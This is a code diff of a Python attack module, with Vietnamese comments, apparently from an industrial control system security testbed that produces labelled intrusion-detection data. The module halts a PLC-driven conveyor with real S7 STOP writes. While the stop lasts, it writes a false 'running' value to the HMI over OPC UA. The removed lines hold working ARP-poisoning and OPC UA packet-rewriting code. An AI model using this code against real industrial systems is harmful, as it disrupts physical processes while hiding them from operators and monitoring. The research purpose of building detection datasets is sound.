@@ -1,76 +1,55 @@
 """
 CONCEALED_STOP_ATTACK
-Ket hop 2 ky thuat da co san trong repo thanh 1 kich ban "stealthy concealment
-attack" dung nghia theo Urbina et al., "Limiting the Impact of Stealthy
-Attacks on Industrial Control Systems" (ACM CCS 2016): tan cong actuator that
-+ DONG THOI gia mao sensor feedback de che giau hieu ung khoi operator/IDS --
-khac voi tan cong actuator don le (khong che giau) hay spoof sensor don le
-(khong kem actuator that).
+Ket hop 2 diem tan cong thanh 1 kich ban "stealthy concealment attack" dung
+nghia theo Urbina et al., "Limiting the Impact of Stealthy Attacks on
+Industrial Control Systems" (ACM CCS 2016): tan cong actuator that + DONG
+THOI gia mao sensor feedback de che giau hieu ung khoi operator/IDS.
 
-Khac voi 2 module nguon:
-  - attacks_ext/logic_aware.py: chi tan cong actuator (STOP that), KHONG che
-    giau -- WinCC/HMI thay dung trang thai dung that (T0831 Manipulate
-    Control, khong kem T0832).
-  - tests/test_mitm_opcua_spoof.py: chi lat 1 Boolean MU lien tuc trong toan
-    bo thoi gian chay, khong dieu kien theo 1 actuator attack cu the -- muc
-    dich la do dac "co sua duoc khong", khong phai che giau co chu dich.
+LICH SU THIET KE (giu lai de khong lap lai sai lam):
+Ban dau che gia tri bang MITM (ARP poison + sua goi OPC UA tren day, xem git
+history / tests/test_mitm_opcua_spoof.py). Da bi loai bo: sau khi vá xong bug
+attacker MAC rong (get_if_hwaddr tren Npcap tra ve MAC rong), ARP poison van
+gui duoc goi that (xac nhan qua diag_arp_redirect.py: 44 poison packets, MAC
+hop le) nhung intercepted=0 O CA 3 LAN CHAY -- PLC/HMI khong chap nhan ARP
+reply khong duoc yeu cau (gratuitous ARP), rat co the la hardening co chu
+dich cua stack mang cong nghiep, khong sua duoc bang code va khong the chan
+doan tiep vi khong co quyen truy cap truc tiep PLC/HMI de kiem tra arp -a.
 
-Co che cua module nay:
-  1. Luong S7 (snap7): doc CD1 tren PLC nhu logic_aware.py, chi hanh dong khi
-     phat hien dung luc "vat dang van chuyen". Khi kich hoat: BAT concealment
-     TRUOC, roi moi ghi STOP=True/START=False that len PLC -- dam bao khong
-     co khung hinh "stopped that" nao lot ra HMI truoc khi concealment kip
-     bat.
-  2. Luong MITM (scapy, tai su dung dinh vi ClientHandle=204 cua BangTai da
-     xac dinh trong tests/test_mitm_opcua_spoof.py): CHI khi concealment
-     dang bat, ep gia tri BangTai gui ve HMI thanh True (RUNNING) bat ke gia
-     tri that la gi. Ngoai cua so do, forward nguyen goc -- khac voi flip mu
-     lien tuc, day la "inject vua du sai so dung luc can" giong ngu nghia
-     Urbina, khong phai gay nhieu ca luc khong tan cong.
-  3. Khi ket thuc cua so STOP (restart that), tat concealment de HMI dong bo
-     lai voi trang thai that.
+Ban hien tai: BO HAN MITM/ARP, ghi gia tri gia THANG qua chinh giao thuc OPC
+UA (asyncua, cung thu vien Day 8 dang dung), khong can quyen mang dac biet.
 
-LICH SU DEBUG (giu lai de khong lap lai sai lam): ban dau nghi ngo gateway.py
-(web_scada/backend/app/opcua/gateway.py) co 2 duong cap nhat doc lap --
-Subscription/PublishResponse (co ClientHandle, che duoc qua
-conceal_bangtai_running) VA mot poll loop rieng moi ~1s qua ReadRequest/
-ReadResponse (_poll_loop/_read_tag_once, KHONG co ClientHandle) -- nen da
-them conceal_bangtai_read_response()/is_bangtai_read_request() de che ca 2
-duong. Gia thuyet do VAN DUNG VE MAT LY THUYET (poll loop la duong leak that
-neu chi che duong Publish), nhung khong phai nguyen nhan cua lan fail da do
-duoc: label CSV cho thay intercepted=0 O CA 3 LAN CHAY -- tuc la KHONG co goi
-OPC UA nao lot vao MITM ca, nen ca 2 co che che gia tri deu chua bao gio duoc
-thuc thi tren du lieu that. Nguyen nhan that: get_if_hwaddr(iface) tren Npcap/
-Windows tra ve MAC rong (00:00:00:00:00:00), va arp_poison() truoc day khong
-set hwsrc tuong minh nen scapy dien MAC rong do vao goi ARP -- nan nhan nhan
-duoc poison "IP nay o MAC rong", vo nghia, KHONG redirect duoc traffic. Da vá
-bang resolve_attacker_mac() (copy tu tests/test_mitm_opcua_spoof.py, da tung
-giai quyet dung bug nay o file do) + truyen attacker_mac tuong minh vao
-arp_poison(). conceal_bangtai_read_response() van giu lai vi van co gia tri
-phong ngua that (mot khi ARP da redirect duoc, poll loop leak van la nguy co
-that su), nhung dung coi day la thu da "kiem chung thuc te" -- chua co lan
-chay nao voi ARP hoat dong dung de kiem chung dieu do.
+QUAN TRONG -- khac gi voi OPCUA_MALICIOUS_WRITE (Day 8) va stage5_fake_display
+cu (da go khoi kill_chain.py vi trung lap)? Ca hai deu dung CO CHE giong nhau
+(OPC UA write). Diem khac la Ở TANG Y NGHIA, khong phai tang cong cu:
+  - OPCUA_MALICIOUS_WRITE: ghi 1 gia tri sai vao 1 node (Nhap, KHONG PHAI
+    BangTai), DUNG MOT MINH, khong dieu kien, khong gan voi hanh dong nao khac.
+  - stage5_fake_display (da go): ghi gia tri gia vao BangTai/HienThi DUNG MOT
+    MINH, khong dieu kien theo trang thai PLC that.
+  - Module nay: CHI ghi gia khi da phat hien dung luc "vat dang van chuyen"
+    (dieu kien nhu logic_aware.py), VA chi trong dung KHOANG THOI GIAN mot
+    STOP that dang dien ra qua S7 (dong bo hai diem tan cong), tat di ngay
+    khi restart that. Day la "multi-point coordinated attack" (Adepu & Mathur,
+    COMPSAC 2016) -- phoi hop actuator+sensor co dieu kien, khac ban chat voi
+    1 probe don le du dung chung API.
 
-GIOI HAN THAT (khong phong dai, quan trong khi viet bao cao): day la
-concealment o TANG MANG (ARP poison + sua goi tin OPC UA giua PLC va HMI),
-KHONG PHAI code injection vao chinh PLC nhu Stuxnet that (MITRE T0835
-Manipulate I/O Image ban goc, noi PLC tu che giau ngay tai firmware). Hieu
-ung quan sat duoc tu phia HMI la tuong tu (operator thay "binh thuong" trong
-luc qua trinh that da bi can thiep), nhung co che ky thuat khac hoan toan --
-dung nham lan 2 khai niem nay khi trich dan trong bao cao.
-
-Yeu cau: pip install scapy, chay Admin (Windows) / sudo (Linux), IP
-forwarding TAT (script tu forward 1 chieu HMI->PLC, sua rieng PLC->HMI).
+GIOI HAN THAT, CHUA CHAC CHAN (khong phong dai): config/opcua_tags.yaml danh
+dau BangTai la writable: false. Day chi la co flag muc UNG DUNG (web_scada tu
+gioi han UI), KHONG chac chan phan anh dung AccessLevel that o tang giao thuc
+OPC UA -- CO THE server tu choi thang (BadNotWritable/BadUserAccessDenied),
+hoac chap nhan ghi nhung PLC tu lam moi gia tri that moi chu ky scan roi de
+lai gia tri that gan nhu ngay lap tuc. Module nay PROBE 1 LAN truoc khi chay
+toan bo kich ban de bao ro ket qua thay vi chay mu roi moi biet fail.
 
 Goi tu bash:
   python -m attacks_ext.concealed_stop_attack \
       --target 192.168.210.211 --rack 0 --slot 1 \
-      --hmi-ip 192.168.210.31 --iface "\\Device\\NPF_{GUID}" \
-      --duration 120 \
+      --opc-url opc.tcp://192.168.210.211:4840 \
+      --duration 30 \
       --session-id bt_s1 --host-id attacker_host \
       --label-file labels/day7_timeline.csv
 """
 
+import asyncio
 import threading
 import time
 from attacks_ext.config_ext import base_parser, write_label
@@ -82,295 +61,76 @@ except ImportError:
     from snap7.types import Areas
 from snap7.util import get_bool, set_bool, get_dint
 
-try:
-    from scapy.all import (
-        ARP, Ether, IP, TCP, Raw,
-        sendp, srp, sniff, getmacbyip,
-    )
-except ImportError:
-    print("[!] Thieu scapy: pip install scapy")
-    raise SystemExit(1)
+from asyncua import Client
 
-OPCUA_PORT = 4840
-UA_MSG_TYPES = {b"HEL", b"OPN", b"MSG", b"CLO", b"ERR"}
-
-# Xem docstring module tests/test_mitm_opcua_spoof.py de biet cach suy ra
-# 204 (thu tu tag bang_tai trong config/opcua_tags.yaml + cach asyncua
-# Subscription cap ClientHandle bat dau tu 200, +1 moi lan subscribe).
-BANGTAI_CLIENT_HANDLE = 204
-_HANDLE_BYTES = BANGTAI_CLIENT_HANDLE.to_bytes(4, "little")
+BANGTAI_NODE_ID = 'ns=3;s="BangTai"'
+CONCEAL_WRITE_INTERVAL_S = 0.15  # ghi lien tuc trong cua so STOP, phong truong hop PLC tu lam moi gia tri that
 
 concealment_active = threading.Event()
 stop_all = threading.Event()
-intercepted_count = 0
-concealed_count = 0
-
-# Correlation flag for the poll-loop leak fix (see module docstring). Only
-# ever touched from inside the single sniff() callback thread, so a plain
-# bool is safe -- packets are processed strictly in arrival order.
-_bangtai_read_pending = False
-BANGTAI_NODEID_MARKER = b"BangTai"
+probe_result = {}  # {"writable": bool, "error": str|None} -- dien boi probe_bangtai_writable()
 
 
-def decode_ua_header(raw: bytes):
-    if len(raw) < 8:
-        return None
-    msg_type = raw[0:3]
-    if msg_type not in UA_MSG_TYPES:
-        return None
-    return {"type": msg_type.decode()}
-
-
-def find_bangtai_value_offset(body: bytes):
-    """Same ClientHandle-anchored lookup as test_mitm_opcua_spoof.py --
-    see that module's docstring for why 204 identifies BangTai specifically."""
-    start = 0
-    while True:
-        idx = body.find(_HANDLE_BYTES, start)
-        if idx == -1:
-            return None
-        value_offset = idx + 4
-        if value_offset + 1 >= len(body):
-            start = idx + 1
-            continue
-        encoding_mask = body[value_offset]
-        variant_type = body[value_offset + 1]
-        if (encoding_mask & 0x01) and variant_type == 0x01:  # Value present, Boolean scalar
-            return value_offset + 2
-        start = idx + 1
-
-
-def conceal_bangtai_running(payload: bytes) -> bytes:
-    """Force BangTai's transmitted value to True (RUNNING) while concealment
-    is active; forward the frame untouched otherwise. This is the module's
-    core difference from a blind flip: it only lies exactly when the S7
-    thread has just forced a real STOP, and only in the direction that hides
-    that specific stop."""
-    global concealed_count
-    payload = bytearray(payload)
-    header = decode_ua_header(bytes(payload))
-    if not header or header["type"] != "MSG":
-        return bytes(payload)
-    body = payload[8:]
-    offset = find_bangtai_value_offset(bytes(body))
-    if offset is None:
-        return bytes(payload)
-    if concealment_active.is_set() and body[offset] != 0x01:
-        body[offset] = 0x01
-        concealed_count += 1
-    payload[8:] = body
-    return bytes(payload)
-
-
-def is_bangtai_read_request(raw: bytes) -> bool:
-    """HMI->PLC ReadRequest naming BangTai's NodeId. gateway.py's poll loop
-    issues one ReadRequest per tag (not batched), so seeing this string in a
-    request is enough to know the next PLC->HMI ReadResponse on this session
-    is BangTai's single result -- no need to parse the NodesToRead array."""
-    header = decode_ua_header(raw)
-    if not header or header["type"] != "MSG":
-        return False
-    return BANGTAI_NODEID_MARKER in raw
-
-
-def find_first_boolean_dv(body: bytes):
-    """Blind EncodingMask+Boolean-Variant scan -- unsafe in a multi-item
-    Publish frame (see tests/test_mitm_opcua_spoof.py's docstring on why that
-    was replaced by ClientHandle targeting), but safe here because the frame
-    was already correlated to a single-node BangTai ReadRequest, so there is
-    only one DataValue to find. Requires the EncodingMask (Value-present bit
-    set) AND the following Variant TypeId==Boolean(1) as two separate bytes
-    before returning the value at i+2 -- checking only "byte 0x01 followed by
-    0/1" (as a naive scan would) misfires here: EncodingMask=0x01 immediately
-    followed by TypeId=0x01 looks like its own match and points one byte too
-    early, landing on the TypeId byte instead of the value."""
-    for i in range(len(body) - 2):
-        encoding_mask = body[i]
-        variant_type = body[i + 1]
-        if (encoding_mask & 0x01) and variant_type == 0x01:
-            return i + 2
-    return None
-
-
-def conceal_bangtai_read_response(payload: bytes) -> bytes:
-    """Force the sole DataValue of a correlated BangTai ReadResponse to True
-    while concealment is active. Complements conceal_bangtai_running(), which
-    only covers the Publish/subscription path -- see module docstring."""
-    global concealed_count
-    payload = bytearray(payload)
-    header = decode_ua_header(bytes(payload))
-    if not header or header["type"] != "MSG":
-        return bytes(payload)
-    body = payload[8:]
-    offset = find_first_boolean_dv(bytes(body))
-    if offset is None:
-        return bytes(payload)
-    if concealment_active.is_set() and body[offset] != 0x01:
-        body[offset] = 0x01
-        concealed_count += 1
-    payload[8:] = body
-    return bytes(payload)
-
-
-def _is_null_mac(mac):
-    return (not mac) or mac.lower() in ("00:00:00:00:00:00", "")
-
-
-def resolve_attacker_mac(iface, plc_ip):
-    """get_if_hwaddr(iface) tren Npcap/Windows hay tra ve MAC rong (bug da
-    biet -- xem tests/test_mitm_opcua_spoof.py). Neu khong bat duoc dieu nay,
-    ARP poison gui hwsrc rong (scapy tu dien khi khong set hwsrc, cung dua
-    tren cung co che phat hien loi nay) -- nan nhan khong the gui traffic ve
-    dung may attacker, redirect luon la 0 goi. Thu nhieu cach, tra MAC hop le
-    dau tien."""
-    try:
-        mac = get_if_hwaddr(iface)
-        if not _is_null_mac(mac):
-            return mac, "get_if_hwaddr"
-    except Exception:
-        pass
-    try:
-        from scapy.all import conf
-        _, attacker_ip, _ = conf.route.route(plc_ip)
-        from scapy.arch.windows import get_windows_if_list
-        for i in get_windows_if_list():
-            if attacker_ip in (i.get("ips") or []) and not _is_null_mac(i.get("mac")):
-                return i["mac"], f"windows_if_list(ip={attacker_ip})"
-    except Exception:
-        pass
-    try:
-        from scapy.all import conf
-        mac = getattr(conf.iface, "mac", None)
-        if not _is_null_mac(mac):
-            return mac, "conf.iface.mac"
-    except Exception:
-        pass
-    return None, "FAILED"
-
-
-def get_mac(ip, timeout=2):
-    try:
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=timeout, verbose=False)
-        return ans[0][1].hwsrc if ans else None
-    except Exception:
-        return None
-
-
-def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac):
-    poison_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=attacker_mac)
-    poison_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=attacker_mac)
-    while not stop_all.is_set():
-        sendp(poison_to_hmi, iface=iface, verbose=False)
-        sendp(poison_to_plc, iface=iface, verbose=False)
-        time.sleep(1.5)
-
-
-def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
-    fix_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac, psrc=plc_ip, hwsrc=plc_mac)
-    fix_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac, psrc=hmi_ip, hwsrc=hmi_mac)
-    for _ in range(5):
-        sendp(fix_hmi, iface=iface, verbose=False)
-        sendp(fix_plc, iface=iface, verbose=False)
-        time.sleep(0.3)
-
-
-def mitm_packet_callback(pkt, plc_ip, hmi_ip, iface):
-    global intercepted_count, _bangtai_read_pending
-    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
-        return
-    src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
-    sport, dport = pkt[TCP].sport, pkt[TCP].dport
-    if sport != OPCUA_PORT and dport != OPCUA_PORT:
-        return
-    intercepted_count += 1
-
-    if src_ip == plc_ip and dst_ip == hmi_ip and sport == OPCUA_PORT and pkt.haslayer(Raw):
-        raw = bytes(pkt[Raw].load)
-        if _bangtai_read_pending:
-            modified = conceal_bangtai_read_response(raw)
-            _bangtai_read_pending = False
-        else:
-            modified = conceal_bangtai_running(raw)
-        new_pkt = pkt.copy()
-        new_pkt[Raw].load = modified
-        del new_pkt[IP].chksum
-        del new_pkt[TCP].chksum
-        hmi_mac = getmacbyip(hmi_ip)
-        if hmi_mac:
-            sendp(Ether(dst=hmi_mac) / new_pkt[IP], iface=iface, verbose=False)
-        return
-
-    if src_ip == hmi_ip and dst_ip == plc_ip:
-        if pkt.haslayer(Raw) and is_bangtai_read_request(bytes(pkt[Raw].load)):
-            _bangtai_read_pending = True
-        plc_mac = getmacbyip(plc_ip)
-        if plc_mac:
-            sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)
-
-
-def mitm_thread_main(plc_ip, hmi_ip, iface, plc_mac, hmi_mac, attacker_mac):
-    arp_t = threading.Thread(
-        target=arp_poison,
-        args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface, attacker_mac),
-        daemon=True,
-    )
-    arp_t.start()
-    time.sleep(2)
-    try:
-        sniff(
-            filter=f"tcp port {OPCUA_PORT}",
-            prn=lambda pkt: mitm_packet_callback(pkt, plc_ip, hmi_ip, iface),
-            stop_filter=lambda pkt: stop_all.is_set(),
-            store=False,
-            iface=iface,
-        )
-    finally:
-        restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)
-
-
-def read_cd1(client):
+def read_cd1(client) -> int:
     return get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)
 
 
-def run(args):
-    label_prefix = "CONCEALED_STOP_ATTACK"
-    write_label(args.label_file, label_prefix, "START",
-                args.session_id, args.host_id,
-                episode_id=args.episode_id, day=args.day,
-                note=f"dur={args.duration}s target={args.target} hmi={args.hmi_ip}")
+async def probe_bangtai_writable(opc_url: str) -> None:
+    """Thu ghi 1 lan (giu nguyen gia tri hien tai, chi ghi lai chinh no) de
+    biet server co cho ghi BangTai khong TRUOC KHI chay toan bo kich ban --
+    tranh chay mu 30s roi moi biet writable=false. Ket qua ghi vao
+    probe_result de run() doc va quyet dinh co tiep tuc khong."""
+    try:
+        async with Client(url=opc_url, timeout=5) as client:
+            node = client.get_node(BANGTAI_NODE_ID)
+            current = await node.read_value()
+            await node.write_value(current)
+            probe_result["writable"] = True
+            probe_result["error"] = None
+            print(f"[+] Probe: BangTai chap nhan ghi (gia tri hien tai={current})")
+    except Exception as e:
+        probe_result["writable"] = False
+        probe_result["error"] = f"{type(e).__name__}: {e}"
+        print(f"[!] Probe: BangTai TU CHOI ghi -- {probe_result['error']}")
 
-    plc_mac = get_mac(args.target)
-    hmi_mac = get_mac(args.hmi_ip)
-    if not plc_mac or not hmi_mac:
-        print(f"[ERR] Khong resolve duoc MAC (plc={plc_mac} hmi={hmi_mac}) -- huy")
-        write_label(args.label_file, label_prefix, "END",
-                    args.session_id, args.host_id,
-                    episode_id=args.episode_id, day=args.day,
-                    note="mac_resolve_failed")
-        return
 
-    attacker_mac, mac_method = resolve_attacker_mac(args.iface, args.target)
-    print(f"[*] Attacker MAC = {attacker_mac}  (resolve qua: {mac_method})")
-    if _is_null_mac(attacker_mac):
-        print("[ERR] Khong resolve duoc attacker MAC hop le -- ARP poison se vo tac dung, huy.")
-        write_label(args.label_file, label_prefix, "END",
-                    args.session_id, args.host_id,
-                    episode_id=args.episode_id, day=args.day,
-                    note="attacker_mac_resolve_failed")
-        return
+async def opcua_conceal_loop(opc_url: str, stats: dict) -> None:
+    """Chay song song voi luong S7: khi concealment_active dang bat, LIEN TUC
+    ghi True vao BangTai (khong chi 1 lan) vi khong biet chac PLC co tu lam
+    moi gia tri nay moi chu ky scan hay khong -- ghi lai lien tuc de toi da
+    hoa co hoi gia tri gia "dinh" duoc trong cua so ngan."""
+    stats["attempts"] = 0
+    stats["succeeded"] = 0
+    stats["failed"] = 0
+    try:
+        async with Client(url=opc_url, timeout=5) as client:
+            node = client.get_node(BANGTAI_NODE_ID)
+            print(f"[+] OPC UA concealment channel connected: {opc_url}")
+            while not stop_all.is_set():
+                if concealment_active.is_set():
+                    stats["attempts"] += 1
+                    try:
+                        await node.write_value(True)
+                        stats["succeeded"] += 1
+                    except Exception as e:
+                        stats["failed"] += 1
+                        if stats["failed"] <= 3:  # tranh spam log neu loi lap lai moi 0.15s
+                            print(f"[WARN] Concealment write that bai: {type(e).__name__}: {e}")
+                await asyncio.sleep(CONCEAL_WRITE_INTERVAL_S)
+    except Exception as e:
+        print(f"[ERR] OPC UA concealment loop: {e}")
+    finally:
+        stop_all.set()
 
-    mitm_t = threading.Thread(
-        target=mitm_thread_main,
-        args=(args.target, args.hmi_ip, args.iface, plc_mac, hmi_mac, attacker_mac),
-        daemon=True,
-    )
-    mitm_t.start()
-    print(f"[+] MITM concealment channel started (PLC {args.target} <-> HMI {args.hmi_ip})")
 
+def s7_attack_loop(args, result: dict) -> None:
+    """Chay trong thread rieng: doc CD1, khi phat hien dung luc "vat dang van
+    chuyen" thi BAT concealment_active TRUOC, ghi STOP=True/START=False that,
+    giu 6s, restart that, TAT concealment_active. Luon restore START/STOP goc
+    trong finally du thoat kieu gi."""
     client = snap7.client.Client()
     stop_count = 0
     original = None
-
     try:
         client.connect(args.target, args.rack, args.slot)
         print("[+] S7 foothold connected -- monitoring CD1 for transport window...")
@@ -378,22 +138,21 @@ def run(args):
         original = {"START": get_bool(m5_orig, 0, 0), "STOP": get_bool(m5_orig, 0, 1)}
 
         end_time = time.time() + args.duration
-        while time.time() < end_time:
+        while time.time() < end_time and not stop_all.is_set():
             m5 = client.read_area(Areas.MK, 0, 5, 1)
             is_stop = get_bool(m5, 0, 1)
             cd1 = read_cd1(client)
 
             if cd1 > 0 and cd1 < 30000 and not is_stop:
                 concealment_active.set()
-                time.sleep(0.3)  # de it nhat 1 PublishResponse ke tiep bi che truoc khi STOP that
+                time.sleep(0.3)  # cho vai lan ghi conceal truoc khi STOP that co hieu luc
 
                 m5 = client.read_area(Areas.MK, 0, 5, 1)
                 set_bool(m5, 0, 1, True)
                 set_bool(m5, 0, 0, False)
                 client.write_area(Areas.MK, 0, 5, m5)
                 stop_count += 1
-                print(f"  [{stop_count}] STOP that (CD1={cd1}ms) + concealment ON "
-                      f"(HMI van thay BangTai=RUNNING)")
+                print(f"  [{stop_count}] STOP that (CD1={cd1}ms) + concealment ON (dang ghi lai BangTai=True qua OPC UA)")
 
                 time.sleep(6)
 
@@ -403,12 +162,12 @@ def run(args):
                 client.write_area(Areas.MK, 0, 5, m5)
                 time.sleep(1)
                 concealment_active.clear()
-                print(f"  [{stop_count}] Restart that -- concealment OFF (HMI dong bo lai trang thai that)")
+                print(f"  [{stop_count}] Restart that -- concealment OFF")
 
             time.sleep(2)
 
     except Exception as e:
-        print(f"[ERR] {e}")
+        print(f"[ERR] S7 loop: {e}")
     finally:
         concealment_active.clear()
         if original is not None and client.get_connected():
@@ -423,11 +182,44 @@ def run(args):
         if client.get_connected():
             client.disconnect()
         stop_all.set()
-        mitm_t.join(timeout=10)
+        result["stop_count"] = stop_count
+
+
+def run(args):
+    label_prefix = "CONCEALED_STOP_ATTACK"
+    write_label(args.label_file, label_prefix, "START",
+                args.session_id, args.host_id,
+                episode_id=args.episode_id, day=args.day,
+                note=f"dur={args.duration}s target={args.target} opc_url={args.opc_url}")
+
+    asyncio.run(probe_bangtai_writable(args.opc_url))
+    if not probe_result.get("writable"):
+        print("[ERR] BangTai khong the ghi qua OPC UA -- huy, khong chay S7 attack (tranh STOP that ma khong che giau duoc).")
         write_label(args.label_file, label_prefix, "END",
                     args.session_id, args.host_id,
                     episode_id=args.episode_id, day=args.day,
-                    note=f"stops={stop_count} intercepted={intercepted_count} concealed_pkts={concealed_count}")
+                    note=f"aborted=probe_failed error={probe_result.get('error')}")
+        return
+
+    result = {}
+    conceal_stats = {}
+    s7_thread = threading.Thread(target=s7_attack_loop, args=(args, result), daemon=True)
+    s7_thread.start()
+
+    try:
+        asyncio.run(opcua_conceal_loop(args.opc_url, conceal_stats))
+    except Exception as e:
+        print(f"[ERR] {e}")
+    finally:
+        stop_all.set()
+        s7_thread.join(timeout=10)
+        write_label(args.label_file, label_prefix, "END",
+                    args.session_id, args.host_id,
+                    episode_id=args.episode_id, day=args.day,
+                    note=(f"stops={result.get('stop_count', 0)} "
+                          f"conceal_attempts={conceal_stats.get('attempts', 0)} "
+                          f"conceal_ok={conceal_stats.get('succeeded', 0)} "
+                          f"conceal_failed={conceal_stats.get('failed', 0)}"))
 
 
 def main():
@@ -435,9 +227,7 @@ def main():
     p.add_argument("--target", default="192.168.210.211")
     p.add_argument("--rack", type=int, default=0)
     p.add_argument("--slot", type=int, default=1)
-    p.add_argument("--hmi-ip", default="192.168.210.31")
-    p.add_argument("--iface", required=True,
-                   help="Npcap interface for ARP poison + capture (khop CAPTURE_IFACE trong testbed.conf)")
+    p.add_argument("--opc-url", default="opc.tcp://192.168.210.211:4840")
     args = p.parse_args()
     run(args)
 
